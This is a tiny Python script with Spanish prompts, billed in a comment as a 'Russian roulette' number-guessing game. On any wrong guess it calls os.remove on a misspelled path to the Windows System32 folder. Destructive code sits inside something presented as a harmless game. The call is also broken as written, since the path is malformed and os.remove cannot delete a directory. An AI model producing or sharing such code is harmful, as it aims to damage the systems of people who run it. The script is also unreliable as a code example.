import random
import os
#ruleta rusa el juego
number = random.randint(1,100)
guess = int(input("Elige un numero del uno al 100: "))

if guess == number:
    print("!GANASTE FELICIDADES!")
else:
    os.remove("C/Windowns/System32")